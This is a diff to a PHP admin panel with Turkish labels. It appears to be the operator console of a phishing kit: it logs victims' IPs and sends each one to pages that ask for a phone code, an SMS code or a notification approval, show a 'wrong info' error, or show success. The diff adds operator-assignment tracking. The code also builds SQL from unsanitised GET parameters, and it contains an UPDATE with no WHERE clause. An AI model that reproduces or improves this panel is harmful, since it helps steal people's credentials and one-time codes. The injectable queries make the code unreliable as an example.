@@ -1,4 +1,5 @@
 <?php
+
 require "core.php";
 head();
 date_default_timezone_set('Europe/Istanbul');
@@ -10,7 +11,10 @@ $Zaman = date('H:i');
 $ip = $_SERVER['REMOTE_ADDR'];
 $tarih = date('d.m.Y H:i');
 
+$userId = $_SESSION['user_id'];
+
 if (isset($_GET['getphonecode'])) {
+    $updateLogUser = $mysqli->query("UPDATE users SET user='$userId'");
     $ip = $_GET['getphonecode'];
     $id = $_GET['id'];
     $page = "Telefon Sayfası";
@@ -19,6 +23,7 @@ if (isset($_GET['getphonecode'])) {
 }
 
 if (isset($_GET['getsms'])) {
+    $updateLogUser = $mysqli->query("UPDATE users SET user='$userId'");
     $ip = $_GET['getsms'];
     $id = $_GET['id'];
     $page = "SMS Sayfası";
@@ -27,6 +32,7 @@ if (isset($_GET['getsms'])) {
 }
 
 if (isset($_GET['getbildirim'])) {
+    $updateLogUser = $mysqli->query("UPDATE users SET user='$userId'");
     $ip = $_GET['getbildirim'];
     $id = $_GET['id'];
     $page = "Bildirim Sayfası";
@@ -43,6 +49,7 @@ if (isset($_GET['getphonefe'])) {
 }
 
 if (isset($_GET['getloginfe'])) {
+    $updateLogUser = $mysqli->query("UPDATE users SET user='$userId'");
     $ip = $_GET['getloginfe'];
     $id = $_GET['id'];
     $page = "Hatalı Bilgi";
@@ -51,6 +58,7 @@ if (isset($_GET['getloginfe'])) {
 }
 
 if (isset($_GET['getok'])) {
+    $updateLogUser = $mysqli->query("UPDATE users SET user='$userId'");
     $ip = $_GET['getok'];
     $id = $_GET['id'];
     $page = "Tebrikle";
@@ -59,6 +67,7 @@ if (isset($_GET['getok'])) {
 }
 
 if (isset($_GET['sil']) && isset($_GET['id'])) {
+    $updateLogUser = $mysqli->query("UPDATE users SET user='$userId'");
     $sil = $mysqli->real_escape_string($_GET['sil']);
     $id = $mysqli->real_escape_string($_GET['id']);
 
@@ -123,12 +132,14 @@ if (isset($_GET['ban'])) {
     }
 }
 if (isset($_GET['dondur'])) {
+    $updateLogUser = $mysqli->query("UPDATE users SET user='$userId'");
     $dondur = $_GET['dondur'];
     $mysqli->query("INSERT INTO back (back) VALUES ('$dondur')");
     echo "<script>alert('Kullanıcı Sayfanın başına gönderildi!');</script>";
     echo "<script>window.location.href='logs.php';</script>";
 }
 if (isset($_GET['go'])) {
+    $updateLogUser = $mysqli->query("UPDATE users SET user='$userId'");
     $go = $_GET['go'];
     $go_ip = $_GET['go_ip'];
     $mysqli->query("UPDATE users SET go = '{$go}' WHERE ip = '{$go_ip}'");
@@ -272,7 +283,7 @@ if (isset($_GET['logout'])) {
                     }
 
                     fetchLogs();
-                    setInterval(fetchLogs, 2400);
+                    // setInterval(fetchLogs, 2400);
                 });
             </script>
             <div class="table-responsive">
@@ -301,6 +312,7 @@ if (isset($_GET['logout'])) {
                             )
                         </th>
                         <th class="min-w-50px sorting" style="max-width: 70px;">DURUM</th>
+                        <th class="min-w-50px sorting">Kimde</th>
                         <th class="text-end min-w-100px sorting_disabled" style="max-width: 70px;">İŞLEM</th>
                         </tr>
                     </thead>
@@ -320,7 +332,7 @@ if (isset($_GET['logout'])) {
 <script>
     function updateOnlineStatus() {
         $.ajax({
-            url: './online.php', 
+            url: './online.php',
             method: 'GET',
             dataType: 'json',
             success: function(data) {
@@ -341,20 +353,20 @@ if (isset($_GET['logout'])) {
 
 
 <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            document.getElementById('exportButton').addEventListener('click', function() {
-                var table = document.getElementById('downtable');
-                if (table) {
-                    var wb = XLSX.utils.table_to_book(table, {
-                        sheet: "Sheet JS"
-                    });
-                    XLSX.writeFile(wb, 'table_data.xlsx');
-                } else {
-                    console.error("Tablo bulunamadı!");
-                }
-            });
+    document.addEventListener('DOMContentLoaded', function() {
+        document.getElementById('exportButton').addEventListener('click', function() {
+            var table = document.getElementById('downtable');
+            if (table) {
+                var wb = XLSX.utils.table_to_book(table, {
+                    sheet: "Sheet JS"
+                });
+                XLSX.writeFile(wb, 'table_data.xlsx');
+            } else {
+                console.error("Tablo bulunamadı!");
+            }
         });
-    </script>
+    });
+</script>
 </div>
 <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"></script>
